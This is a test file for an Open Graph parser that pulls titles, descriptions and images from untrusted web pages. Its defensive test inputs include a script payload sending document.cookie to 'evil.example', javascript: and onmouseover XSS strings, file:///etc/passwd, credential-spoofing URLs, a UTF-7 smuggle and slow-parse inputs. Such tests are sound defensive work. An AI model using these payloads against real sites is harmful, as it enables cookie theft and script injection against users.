import { describe, expect, it } from 'vitest';
import { DESCRIPTION_MAX, SITE_NAME_MAX, TITLE_MAX, cleanText, decodeEntities, decodeHtml, parseOpenGraph } from './openGraph';

// A page is a stranger's text: what comes out of it must be short, plain,
// and only ever a URL the link rules take.

const BASE = 'https://example.com/articles/one';
const head = (inner: string) => `<!doctype html><html><head>${inner}</head><body><p>body</p></body></html>`;
const parse = (html: string | Uint8Array, charset?: string | null, baseUrl = BASE) =>
  parseOpenGraph(typeof html === 'string' ? Buffer.from(html) : html, { baseUrl, charset });

describe('reading the tags', () => {
  it('reads Open Graph title, description, site name and image', () => {
    const og = parse(
      head(`
        <meta property="og:title" content="A Rainy Walk">
        <meta property="og:description" content="Notes from a walk after the rain.">
        <meta property="og:site_name" content="Resonance">
        <meta property="og:image" content="https://cdn.example.com/walk.jpg">
        <title>ignored title</title>`),
    );
    expect(og).toEqual({
      title: 'A Rainy Walk',
      description: 'Notes from a walk after the rain.',
      siteName: 'Resonance',
      image: 'https://cdn.example.com/walk.jpg',
    });
  });

  it('copes with attribute order, quote style, case and spacing', () => {
    const og = parse(
      head(`
        <META CONTENT='Single "quoted"' PROPERTY='og:title' />
        <meta content=unquoted-description property=og:description>
        <meta
           name = "og:site_name"
           content = "Spaced Out"
        >`),
    );
    expect(og).toMatchObject({ title: 'Single "quoted"', description: 'unquoted-description', siteName: 'Spaced Out' });
  });

  it('takes a > inside a quoted value as part of the value', () => {
    expect(parse(head('<meta property="og:title" content="1 > 0, 2 &gt; 1"><meta property="og:site_name" content="after">'))).toMatchObject({
      title: '1 0, 2 1',
      siteName: 'after',
    });
  });

  it('falls back from Open Graph to Twitter to the plain tags', () => {
    expect(parse(head('<title>Plain</title><meta name="description" content="plain desc">'))).toEqual({ title: 'Plain', description: 'plain desc' });
    expect(
      parse(head('<title>Plain</title><meta name="twitter:title" content="Tw"><meta name="twitter:description" content="tw desc"><meta name="twitter:image" content="/t.png">')),
    ).toEqual({ title: 'Tw', description: 'tw desc', image: 'https://example.com/t.png' });
    expect(parse(head('<meta property="og:title" content="OG"><meta name="twitter:title" content="Tw"><title>Plain</title>')).title).toBe('OG');
    // An empty Open Graph value falls through to the next source.
    expect(parse(head('<meta property="og:title" content="   "><title>Real</title>')).title).toBe('Real');
  });

  it('keeps the first of repeated tags', () => {
    expect(parse(head('<meta property="og:title" content="first"><meta property="og:title" content="second">')).title).toBe('first');
  });

  it('reads a title that spans lines, in any case', () => {
    expect(parse(head('<TITLE class="x">\n  Spaced\n  title\n</TITLE>')).title).toBe('Spaced title');
  });

  it('says nothing for a page with nothing to say', () => {
    expect(parse('')).toEqual({});
    expect(parse('<html><head></head><body>hi</body></html>')).toEqual({});
    expect(parse('not html at all')).toEqual({});
    expect(parse(Buffer.alloc(2000, 0xff))).toEqual({});
  });

  it('reads only the head', () => {
    expect(parse('<html><head><title>Head</title></head><body><meta property="og:title" content="Body"><title>Body</title></body></html>').title).toBe('Head');
    // No </head> at all: the whole (capped) page is the head.
    expect(parse('<title>Headless</title><p>hi</p>').title).toBe('Headless');
  });

  it('is not fooled by tags that only look like tags', () => {
    const html = head(`
      <!-- <meta property="og:title" content="commented out"> -->
      <script>var x = '<meta property="og:title" content="in a script">'; document.write("<title>nope</title>")</script>
      <style>/* <title>in a style</title> */</style>
      <noscript><meta property="og:site_name" content="noscript"></noscript>
      <template><title>template</title></template>
      <metadata property="og:title" content="metadata is not meta"></metadata>
      <title>The Real One</title>`);
    expect(parse(html)).toEqual({ title: 'The Real One' });
  });

  it('survives an unterminated comment, script or tag', () => {
    expect(parse('<head><meta property="og:title" content="kept"><!-- never closed <meta property="og:site_name" content="lost">').title).toBe('kept');
    expect(parse('<head><title>kept</title><script>never closed <title>lost</title>').title).toBe('kept');
    expect(parse('<head><title>kept</title><meta property="og:description" content="never closed').title).toBe('kept');
  });
});

describe('characters and entities', () => {
  it('decodes named, decimal and hexadecimal references once', () => {
    expect(decodeEntities('Tom &amp; Jerry &copy; &#20320;&#x597D; &hellip; &#x1F600;')).toBe('Tom & Jerry © 你好 … 😀');
    expect(decodeEntities('&amp;lt;b&amp;gt;')).toBe('&lt;b&gt;');
    expect(decodeEntities('&unknownthing; &#0; &#x110000; &#xD800; &#99999999;')).toBe('&unknownthing; � � � &#99999999;');
    expect(decodeEntities('AT&T & friends &')).toBe('AT&T & friends &');
  });

  it('takes the charset from the header, a BOM or a meta tag, and falls back to UTF-8', () => {
    const big5 = Buffer.from([0xa7, 0x41, 0xa6, 0x6e]); // 你好 in Big5
    expect(decodeHtml(big5, 'big5')).toBe('你好');
    expect(decodeHtml(Buffer.concat([Buffer.from('<meta charset="Big5"><title>'), big5, Buffer.from('</title>')])).includes('你好')).toBe(true);
    expect(decodeHtml(Buffer.concat([Buffer.from('<meta http-equiv="Content-Type" content="text/html; charset=big5">'), big5])).endsWith('你好')).toBe(true);
    expect(decodeHtml(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('é')]), 'big5')).toBe('é');
    expect(decodeHtml(Buffer.from([0xff, 0xfe, 0x41, 0x00]), 'utf-8')).toBe('A');
    expect(decodeHtml(Buffer.from('plain é'), 'utf-8')).toBe('plain é');
    // A label the runtime doesn't know, and one it must not honour, fall back to UTF-8.
    expect(decodeHtml(Buffer.from('é'), 'not-a-charset')).toBe('é');
    expect(decodeHtml(Buffer.from('+ADw-script+AD4-'), 'utf-7')).toBe('+ADw-script+AD4-');
    expect(decodeHtml(Buffer.from('é'), '"><script>')).toBe('é');
  });

  it('reads a Big5 page end to end', () => {
    const page = Buffer.concat([
      Buffer.from('<html><head><meta charset="big5"><title>'),
      Buffer.from([0xa7, 0x41, 0xa6, 0x6e]),
      Buffer.from('</title></head>'),
    ]);
    expect(parse(page).title).toBe('你好');
    expect(parse(Buffer.concat([Buffer.from('<head><title>'), Buffer.from([0xa7, 0x41, 0xa6, 0x6e]), Buffer.from('</title>')]), 'Big5').title).toBe('你好');
  });

  it('uses only the tags a cut-short page finished', () => {
    const full = '<head><title>你好世界</title><meta property="og:description" content="你好世界"><meta property="og:site_name" content="Site">';
    const bytes = Buffer.from(full);
    // Cut in the middle of the description's value, and of one of its characters.
    const cut = bytes.subarray(0, bytes.indexOf('你好世界"') + 4);
    expect(parse(cut)).toEqual({ title: '你好世界' });
    // The title tag cut before its end: nothing, rather than half a title.
    expect(parse(bytes.subarray(0, bytes.indexOf('你好世界') + 7))).toEqual({});
    expect(parse(Buffer.from('<head><meta property="og:title" content="Half'))).toEqual({});
    expect(parse(Buffer.from('<head><meta property="og:title" content="Whole"><meta property="og:desc'))).toEqual({ title: 'Whole' });
  });
});

describe('what the text is cleaned of', () => {
  it('collapses white space and trims', () => {
    expect(cleanText('  one \n\t two\u00a0\u3000three  ', 100)).toBe('one two three');
  });

  it('removes control, direction-override and zero-width characters', () => {
    expect(cleanText('a\u0000b\u0007c\u001bd\u007fe\u0085f', 50)).toBe('abcde f');
    expect(cleanText('safe\u202egnp.exe', 50)).toBe('safegnp.exe');
    expect(cleanText('\u2066x\u2069 y\u200bz\u200d\ufeffw\u00ad!', 50)).toBe('x yzw!');
    expect(cleanText('tag\u{e0041}\u{e0042}chars', 50)).toBe('tagchars');
    expect(cleanText('lone \ud800 surrogate', 50)).not.toMatch(/[\ud800-\udfff]/);
  });

  it('leaves no markup in the text: tags are dropped, angle brackets too', () => {
    expect(cleanText('<script>alert(1)</script>Hello', 50)).toBe('alert(1) Hello');
    expect(cleanText('&lt;img src=x onerror=alert(1)&gt;Hi', 50)).toBe('Hi');
    expect(cleanText('&lt;b&gt;bold&lt;/b&gt; &amp;lt;i&amp;gt;', 50)).toBe('bold &lt;i&gt;');
    expect(cleanText('1 < 2 > 0', 50)).toBe('1 0'); // what sits between < and > is taken for a tag
    expect(cleanText('<<<>>>', 50)).toBe('');
    expect(cleanText('"quotes" & \'ticks\' stay', 50)).toBe('"quotes" & \'ticks\' stay');
  });

  it('cuts by code points, never through an emoji, and ends a cut text with an ellipsis', () => {
    const long = '😀'.repeat(200);
    const cut = cleanText(long, TITLE_MAX);
    expect(Array.from(cut)).toHaveLength(TITLE_MAX);
    expect(cut.endsWith('…')).toBe(true);
    expect(cut.isWellFormed()).toBe(true);
    expect(cleanText('x'.repeat(TITLE_MAX), TITLE_MAX)).toBe('x'.repeat(TITLE_MAX));
    expect(Array.from(cleanText('你'.repeat(500), DESCRIPTION_MAX))).toHaveLength(DESCRIPTION_MAX);
  });

  it('applies the caps to each field', () => {
    const og = parse(
      head(
        `<meta property="og:title" content="${'t'.repeat(500)}">` +
          `<meta property="og:description" content="${'d'.repeat(900)}">` +
          `<meta property="og:site_name" content="${'s'.repeat(300)}">`,
      ),
    );
    expect(Array.from(og.title!)).toHaveLength(TITLE_MAX);
    expect(Array.from(og.description!)).toHaveLength(DESCRIPTION_MAX);
    expect(Array.from(og.siteName!)).toHaveLength(SITE_NAME_MAX);
  });

  it('does not let a title become an injection of any kind in the result', () => {
    const og = parse(
      head(
        `<meta property="og:title" content="&lt;script&gt;fetch('//evil.example/'+document.cookie)&lt;/script&gt;">` +
          `<meta property="og:description" content="x&quot; onmouseover=&quot;alert(1)&quot;&gt;&lt;a href=javascript:alert(1)&gt;click">`,
      ),
    );
    expect(og.title).not.toMatch(/[<>]/);
    expect(og.description).not.toMatch(/[<>]/);
  });
});

describe('the image', () => {
  const imageOf = (inner: string, baseUrl = BASE) => parse(head(inner), null, baseUrl).image;

  it('resolves a relative, root-relative or protocol-relative URL against the page', () => {
    expect(imageOf('<meta property="og:image" content="cover.jpg">')).toBe('https://example.com/articles/cover.jpg');
    expect(imageOf('<meta property="og:image" content="/img/cover.jpg">')).toBe('https://example.com/img/cover.jpg');
    expect(imageOf('<meta property="og:image" content="//cdn.example.net/c.png">')).toBe('https://cdn.example.net/c.png');
    expect(imageOf('<meta property="og:image" content="../up.png">', 'https://example.com/a/b/c')).toBe('https://example.com/a/up.png');
  });

  it('decodes entities in the URL and takes the secure_url first', () => {
    expect(imageOf('<meta property="og:image" content="https://i.example.com/a.jpg?w=1&amp;h=2">')).toBe('https://i.example.com/a.jpg?w=1&h=2');
    expect(
      imageOf('<meta property="og:image" content="http://i.example.com/a.jpg"><meta property="og:image:secure_url" content="https://i.example.com/a.jpg">'),
    ).toBe('https://i.example.com/a.jpg');
  });

  it.each([
    ['javascript:alert(1)'],
    ['data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='],
    ['data:image/png;base64,iVBORw0KGgo='],
    ['file:///etc/passwd'],
    ['ftp://example.com/a.png'],
    ['blob:https://example.com/uuid'],
    ['https://user:pw@example.com/a.png'],
    ['https://example.com@evil.example/a.png'],
    ['http://example.com:8080/a.png'],
    ['http://localhost/a.png'],
    ['http://[::1]/a.png'],
    [''],
    ['   '],
  ])('drops an image that is %j', (value) => {
    expect(imageOf(`<meta property="og:image" content="${value}">`)).toBeUndefined();
  });

  it('percent-encodes a space the way a browser would', () => {
    expect(imageOf('<meta property="og:image" content="/a b.png">')).toBe('https://example.com/a%20b.png');
  });

  it('moves on to the next source when the first image is unusable', () => {
    expect(imageOf('<meta property="og:image" content="javascript:x"><meta name="twitter:image" content="https://ok.example.com/i.png">')).toBe('https://ok.example.com/i.png');
  });

  it('keeps an address that is merely private: whether to fetch it is the fetcher\'s question', () => {
    expect(imageOf('<meta property="og:image" content="http://10.0.0.1/a.png">')).toBe('http://10.0.0.1/a.png');
  });
});

describe('pages built to be slow to read', () => {
  const timed = (html: string) => {
    const started = performance.now();
    const og = parse(html);
    return { og, ms: performance.now() - started };
  };

  it('reads a page of 512 KB of unterminated scripts in one pass', () => {
    const { ms } = timed('<head>' + '<script '.repeat(65000));
    expect(ms).toBeLessThan(1000);
  });

  it('reads a page of tens of thousands of comments, styles and templates in one pass', () => {
    const { og, ms } = timed('<head>' + '<!--x-->'.repeat(30000) + '<style></style>'.repeat(10000) + '<template></template>'.repeat(5000) + '<title>found</title>');
    expect(og.title).toBe('found');
    expect(ms).toBeLessThan(1000);
  });

  it('reads a page of unterminated tags and quotes', () => {
    expect(timed('<head>' + '<meta content="'.repeat(30000)).ms).toBeLessThan(1000);
    expect(timed('<head>' + '<meta '.repeat(80000)).ms).toBeLessThan(1000);
    expect(timed('<head>' + '<title>'.repeat(70000)).ms).toBeLessThan(1000);
    expect(timed('<head>' + '<'.repeat(500000)).ms).toBeLessThan(1000);
    expect(timed('<head>' + '&'.repeat(500000)).ms).toBeLessThan(1000);
  });

  it('reads only so many meta tags', () => {
    const many = '<meta name="a" content="b">'.repeat(2000);
    const { og, ms } = timed(`<head>${many}<meta property="og:title" content="too late">`);
    expect(og.title).toBeUndefined();
    expect(ms).toBeLessThan(1000);
  });
});
